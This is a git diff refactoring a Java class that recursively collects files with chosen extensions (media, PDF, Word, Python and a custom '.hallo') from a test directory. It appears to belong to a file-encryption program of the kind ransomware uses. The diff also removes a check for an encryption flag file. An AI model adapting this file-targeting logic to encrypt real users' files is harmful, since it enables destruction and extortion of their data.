@@ -8,13 +8,27 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
-import static cipher.CryptionKeys.A_FLAG_FILE;
-
 public class SearchTarget {
 
+  // ターゲットパス
   private String path;
+
+  public SearchTarget() {
+    path = GetTestPath.TEST_PATH;
+    searchDir(path);
+  }
+
+  public String getPath() {
+    return path;
+  }
+
   // ターゲットになるファイルのリスト
   private List<File> targetList = new ArrayList<>();
+
+  public List<File> getTargetList() {
+    return targetList;
+  }
+
   // ターゲットにしたい拡張子のリスト
   private List<String> targetExtensionList = Arrays.asList(
       ".mp3",
@@ -26,19 +40,8 @@ public class SearchTarget {
       ".pdf",
       ".docx",
       ".py",
-      ".hallo" // TODO 暫定:: 復号化の際に詮索対象になるように追加
+      ".hallo" // TODO 暫定 - 復号化の際に詮索対象になるように追加
   );
-
-  // TODO path getter & setter
-
-  public SearchTarget() {
-    searchDir(GetTestPath.TEST_PATH);
-    this.path = GetTestPath.TEST_PATH;
-  }
-
-  public List<File> getTargetList() {
-    return targetList;
-  }
 
   private void searchDir(String path) {
     // path 指定 dir 内のファイルリスト
@@ -64,11 +67,5 @@ public class SearchTarget {
 
   private boolean isTargetFile(File file) {
     return !file.isDirectory() && targetExtensionList.contains(FileUtillity.getExtension(file));
-  }
-
-  public boolean hasEncryptFlag() {
-    File targetDir = new File(this.path);
-    return Arrays.stream(targetDir.listFiles())
-        .anyMatch(file -> file.getName().equals(A_FLAG_FILE));
   }
 }
